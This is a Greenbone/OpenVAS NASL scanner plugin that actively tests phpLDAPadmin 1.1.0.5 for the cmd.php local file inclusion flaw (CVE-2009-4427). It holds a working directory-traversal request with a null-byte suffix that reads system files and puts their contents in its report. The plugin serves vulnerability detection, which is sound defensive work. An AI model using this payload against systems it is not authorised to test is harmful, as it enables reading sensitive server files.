# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:phpldapadmin_project:phpldapadmin";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100396");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2009-12-15 19:11:56 +0100 (Tue, 15 Dec 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2009-4427");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_name("phpLDAPadmin 1.1.0.5 'cmd.php' LFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("gb_phpldapadmin_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpldapadmin/http/detected");

  script_tag(name:"summary", value:"phpLDAPadmin is prone to a local file include (LFI)
  vulnerability because it fails to sufficiently sanitize user-supplied data.");

  script_tag(name:"impact", value:"Exploiting this issue may allow an attacker to compromise the
  application and the underlying system, other attacks are also possible.");

  script_tag(name:"affected", value:"phpLDAPadmin version 1.1.0.5 is know to be vulnerable. Other
  versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210121193353/http://www.securityfocus.com/bid/37327");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/index.php";
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if(!buf)
  exit(0);

c = eregmatch(pattern:"PLASESSID=([^;]+);", string:buf);
if(!c)
  exit(0);

cookie = c[1];
files = traversal_files();

host = http_host_name(port:port);

foreach pattern(keys(files)) {

  file = files[pattern];

  req = string("GET ", dir, "/cmd.php?cmd=../../../../../../../../../", file, "%00 HTTP/1.1\r\nHost: ",
               host, "\r\nCookie: PLASESSID=", cookie, "\r\n\r\n");
  res = http_keepalive_send_recv(port:port, data:req);
  if(!res)
    continue;

  if(egrep(pattern:pattern, string:res, icase:FALSE)) {
    report = 'It was possible to obtain /' + file + ' with a directory traversal attack: ' + http_report_vuln_url(port:port, url:url, url_only:TRUE) + '\n\nResult:\n' + res;
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
